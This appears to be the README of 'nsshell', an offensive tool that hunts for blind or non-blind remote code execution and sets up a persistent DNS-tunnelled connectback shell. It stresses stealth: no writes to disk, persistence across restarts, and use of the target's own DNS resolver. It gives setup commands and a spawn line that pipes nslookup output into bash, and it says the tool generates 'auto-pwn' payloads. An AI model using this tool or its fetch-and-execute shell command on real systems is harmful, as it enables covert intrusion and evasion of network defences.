<img src="https://github.com/TheRook/nsshell/blob/master/icon.png?raw=true" width="64">

Think sqlmap meets xsshunter - but looking for (blind/nonblind) RCE to get a DNS connectback shell. 

- persistent shell (even if you exit nsshell.py)
- doesn't touch disk
- resumes access when you restart nsshell.py
- nothing to install or compile for the target
- the target can use their own trusted DNS resolver - or automatically upgrade to a direct connection for speed

Start:
The tool needs to know which domain it has control over:

sudo ./nsshell.py host.com 123.123.123.112

**wrote connectback payloads to:payloads.txt**

The file above contains a list of auto-pwns. Run one of the payloads and a persistent shell will be loaded over DNS.

### install
sudo make install

### Run Server - localhost for testing
sudo python nsshell.py localhost 127.0.0.1

### Spawn Connectback shell - localhost for testing
nslookup 1 localhost | bash

That's all folks!
